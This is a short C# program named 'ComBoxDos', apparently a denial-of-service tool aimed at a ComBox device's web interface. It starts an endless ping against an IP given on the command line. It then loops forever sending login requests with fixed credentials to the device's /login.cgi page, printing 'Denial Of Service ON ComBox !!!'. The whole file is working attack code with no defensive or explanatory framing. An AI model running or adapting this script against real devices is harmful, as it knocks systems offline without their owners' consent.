using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace ComBoxDos
{
    class Program
    {
        static void Main(string[] args)
        {
            string[] m_IPAdress = args[0].Split(':');
            try
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("=====================================================");
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine("Denial Of Service ON ComBox !!!");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("=====================================================");
                Console.ForegroundColor = ConsoleColor.Gray;
                Process.Start("cmd.exe", "/k ping " + m_IPAdress[0] + " -t");
                while (true)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.Write("ComBox Packet Sent to:" + m_IPAdress[0]);
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine(m_IPAdress[0] + ":" + m_IPAdress[1]);
                    //Console.ReadLine();
                    try
                    {
                        WebRequest request = WebRequest.Create("http://" + m_IPAdress[0] + ":" + m_IPAdress[1] + "/login.cgi?login_username=Nation-E&login_password=DOS&submit=Log+In");
//                        request.Timeout = 35000;
                        Console.ForegroundColor = ConsoleColor.Magenta;
                        Console.WriteLine("waiting for " + m_IPAdress[0] + " to get up !!!");
                        Console.ForegroundColor = ConsoleColor.Gray;
                        WebResponse responsee = request.GetResponse();
                    }
                    catch (Exception ex)
                    { }
                }
            }
            catch (Exception ex)
            { }
        }
    }
}
